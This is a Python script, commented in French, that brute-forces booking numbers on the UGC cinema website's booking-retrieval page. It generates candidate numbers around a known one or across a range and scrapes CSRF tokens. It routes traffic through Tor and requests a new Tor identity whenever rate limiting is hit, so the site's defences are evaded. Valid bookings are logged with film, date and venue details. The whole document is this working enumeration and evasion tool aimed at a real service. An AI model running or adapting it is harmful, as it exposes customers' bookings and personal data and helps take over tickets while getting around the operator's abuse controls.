#!/usr/bin/env python3
"""
UGC brute forcer via Tor — rotation IP automatique sur 429
Chaque rate limit = nouvelle identité Tor = nouvelle IP

Requirements:
  1. Installer Tor: https://www.torproject.org/download/ (Tor Browser suffit)
  2. pip install requests[socks] stem beautifulsoup4

Tor doit tourner en background sur 127.0.0.1:9050 (SOCKS5)
ControlPort: 9051 (activer dans torrc si besoin)

Usage:
  python ugc_tor.py --known 33500063B071466134 --radius 300 --threads 3
  python ugc_tor.py --prefix 335000 --start 63000000 --end 63001000
"""

import re, time, random, argparse, threading, queue, socket
from pathlib import Path
from datetime import datetime

import requests, urllib3
urllib3.disable_warnings()
from bs4 import BeautifulSoup

# ─── TOR ──────────────────────────────────────────────────────────────────────
TOR_PROXY = {
    "http":  "socks5h://127.0.0.1:9050",
    "https": "socks5h://127.0.0.1:9050",
}

def tor_alive() -> bool:
    try:
        s = socket.create_connection(("127.0.0.1", 9050), timeout=3)
        s.close()
        return True
    except Exception:
        return False

def new_tor_identity():
    """Demande une nouvelle identité Tor via ControlPort 9051."""
    try:
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as c:
            c.authenticate()
            c.signal(Signal.NEWNYM)
            time.sleep(2)   # Tor a besoin ~2s pour changer
            return True
    except ImportError:
        # stem pas installé — on essaie via socket brut
        try:
            s = socket.create_connection(("127.0.0.1", 9051), timeout=3)
            s.sendall(b"AUTHENTICATE\r\nSIGNAL NEWNYM\r\nQUIT\r\n")
            s.close()
            time.sleep(2)
            return True
        except Exception:
            return False
    except Exception:
        return False

def make_tor_session():
    s = requests.Session()
    s.proxies = TOR_PROXY
    s.verify  = False
    s.headers.update({
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
        "Accept-Language": "fr-FR,fr;q=0.9",
        "Referer":         "https://www.ugc.fr/",
        "Origin":          "https://www.ugc.fr",
    })
    return s

def make_direct_session():
    """Fallback sans Tor si Tor pas dispo."""
    try:
        import cloudscraper
        s = cloudscraper.create_scraper(browser={"browser":"chrome","platform":"windows"})
    except ImportError:
        s = requests.Session()
        s.verify = False
    s.headers.update({
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124 Safari/537.36",
        "Accept-Language": "fr-FR,fr;q=0.9",
        "Referer":         "https://www.ugc.fr/",
    })
    return s

# ─── UGC CHECK ────────────────────────────────────────────────────────────────
ENDPOINT  = "https://www.ugc.fr/reservation/retrieveBooking.html"
ERROR_KW  = ["introuvable","invalid","not found","aucune","incorrect","erreur"]
SUCCESS_KW = ["séance","votre billet","votre réservation","film","salle","places","montant"]

def parse_csrf(html: str):
    soup = BeautifulSoup(html, "html.parser")
    for name in ["_csrf","csrfToken","csrf_token","token","_token"]:
        el = soup.find("input", {"name": name})
        if el:
            return name, el.get("value","")
    for el in soup.find_all("input", {"type":"hidden"}):
        nm = el.get("name","")
        if "token" in nm.lower():
            return nm, el.get("value","")
    return None, None

def check_one(num: str, sess) -> dict:
    num = num.strip().upper()
    try:
        r1 = sess.get(ENDPOINT, timeout=15, allow_redirects=True)
        if r1.status_code == 429:
            return {"num": num, "valid": None, "details": "RATE_LIMITED"}

        csrf_name, csrf_val = parse_csrf(r1.text)
        payload = {"bookingNumber": num, "retrieveBooking": "true"}
        if csrf_name and csrf_val:
            payload[csrf_name] = csrf_val

        r2 = sess.post(ENDPOINT, data=payload, timeout=15, allow_redirects=True)

        if r2.status_code == 429:
            return {"num": num, "valid": None, "details": "RATE_LIMITED"}

        low = r2.text.lower()

        if any(k in low for k in ERROR_KW):
            return {"num": num, "valid": False, "details": "not found"}

        if any(k in low for k in SUCCESS_KW):
            soup = BeautifulSoup(r2.text, "html.parser")
            details = []
            for pat, lbl in [(r"film|movie","film"),(r"date|seance","date"),(r"cinema|lieu","lieu")]:
                el = soup.find(class_=re.compile(pat, re.I))
                if el:
                    details.append(f"{lbl}: {el.get_text(strip=True)[:50]}")
            if not details:
                t = soup.find("title")
                if t:
                    details.append(t.get_text(strip=True)[:60])
            return {"num": num, "valid": True, "details": " | ".join(details) or "trouvé"}

        return {"num": num, "valid": None, "details": f"HTTP {r2.status_code}"}

    except Exception as e:
        return {"num": num, "valid": None, "details": str(e)[:60]}

# ─── WORKER ───────────────────────────────────────────────────────────────────
LOCK      = threading.Lock()
FOUND     = []
STATS     = {"checked": 0, "valid": 0, "rate": 0, "rotations": 0}
STOP_FLAG = threading.Event()

def worker(work_q: queue.Queue, out_file: str, delay: float, use_tor: bool):
    sess   = make_tor_session() if use_tor else make_direct_session()
    rate_hits = 0

    while not STOP_FLAG.is_set():
        try:
            num = work_q.get(timeout=2)
        except queue.Empty:
            break

        res = check_one(num, sess)

        if res["details"] == "RATE_LIMITED":
            with LOCK:
                STATS["rate"] += 1
            rate_hits += 1
            work_q.put(num)  # requeue

            if rate_hits >= 3:
                # trop de 429 → rotation d'IP
                with LOCK:
                    STATS["rotations"] += 1
                rotated = new_tor_identity() if use_tor else False
                if rotated:
                    sess = make_tor_session()
                    rate_hits = 0
                    with LOCK:
                        print(f"\n  [🔄] Tor identity rotated")
                else:
                    # pas de rotation possible → sleep long
                    time.sleep(30 + random.uniform(0, 10))
                    rate_hits = 0
            else:
                time.sleep(3 + random.uniform(0, 2))
            work_q.task_done()
            continue

        with LOCK:
            STATS["checked"] += 1
            c     = STATS["checked"]
            total = c + work_q.qsize()
            pct   = (c / max(total, 1)) * 100

            if res["valid"] is True:
                STATS["valid"] += 1
                FOUND.append(res)
                line = f"✅ VALID: {res['num']} — {res['details']}"
                print(f"\n  [{line}]")
                with open(out_file, "a", encoding="utf-8") as f:
                    f.write(f"{datetime.now().isoformat()} | {line}\n")

            print(f"  [{c:>5}/{total}] {pct:5.1f}%  valid={STATS['valid']}  "
                  f"429={STATS['rate']}  rot={STATS['rotations']}  "
                  f"last={num[:20]}", end="\r", flush=True)

        time.sleep(delay + random.uniform(0, delay * 0.3))
        work_q.task_done()

# ─── GÉNÉRATION ───────────────────────────────────────────────────────────────
def gen_radius(known: str, radius: int):
    m = re.match(r"^(.*?)(\d+)$", known)
    if not m:
        return [known]
    prefix, tail_str = m.group(1), m.group(2)
    tail = int(tail_str)
    nums = []
    for d in range(-radius, radius + 1):
        v = tail + d
        if v >= 0:
            nums.append(f"{prefix}{str(v).zfill(len(tail_str))}")
    return nums

def gen_range(prefix: str, start: int, end: int):
    return [f"{prefix}{i}" for i in range(start, end + 1)]

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    p = argparse.ArgumentParser(description="UGC brute forcer via Tor")
    p.add_argument("--known",   help="Numéro connu (ex: 33500063B071466134)")
    p.add_argument("--radius",  type=int, default=300)
    p.add_argument("--prefix",  default="335000")
    p.add_argument("--start",   type=int, default=63000000)
    p.add_argument("--end",     type=int, default=63001000)
    p.add_argument("--threads", type=int, default=3)
    p.add_argument("--delay",   type=float, default=1.5)
    p.add_argument("--output",  default="ugc_valid.txt")
    p.add_argument("--no-tor",  action="store_true", help="Désactive Tor (connexion directe)")
    args = p.parse_args()

    use_tor = not args.no_tor

    if use_tor:
        if tor_alive():
            print("[✓] Tor SOCKS5 détecté sur 127.0.0.1:9050")
            # check identité via ControlPort
            if new_tor_identity():
                print("[✓] Tor ControlPort OK — rotation automatique active")
            else:
                print("[!] Tor ControlPort 9051 non accessible")
                print("    La rotation auto est désactivée — active le ControlPort dans torrc:")
                print("    ControlPort 9051")
                print("    CookieAuthentication 0")
        else:
            print("[!] Tor non détecté sur 127.0.0.1:9050")
            print("    Lance Tor Browser puis réessaie, ou utilise --no-tor")
            use_tor = False
            print("[*] Fallback: connexion directe (sans rotation IP)")
    else:
        print("[*] Mode direct (sans Tor)")

    if args.known:
        nums = gen_radius(args.known, args.radius)
        print(f"[*] Radius: ±{args.radius} autour de {args.known} = {len(nums)} numéros")
    else:
        nums = gen_range(args.prefix, args.start, args.end)
        print(f"[*] Range: {args.prefix}{args.start}→{args.end} = {len(nums)} numéros")

    random.shuffle(nums)
    q = queue.Queue()
    for n in nums:
        q.put(n)

    print(f"[*] {len(nums)} numéros | {args.threads} threads | delay={args.delay}s")
    print(f"[*] Output: {args.output}")
    print("─" * 60)

    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=worker,
            args=(q, args.output, args.delay, use_tor),
            daemon=True
        )
        t.start()
        threads.append(t)

    try:
        q.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        STOP_FLAG.set()

    for t in threads:
        t.join(timeout=3)

    print(f"\n\n{'═'*60}")
    print(f"  Checked   : {STATS['checked']}")
    print(f"  Valid     : {STATS['valid']}")
    print(f"  429s      : {STATS['rate']}")
    print(f"  Rotations : {STATS['rotations']}")
    if FOUND:
        print(f"\n  ✅ VALIDES:")
        for r in FOUND:
            print(f"     {r['num']} — {r['details']}")
    print(f"\n  → {args.output}")
    print('═'*60)

if __name__ == "__main__":
    main()
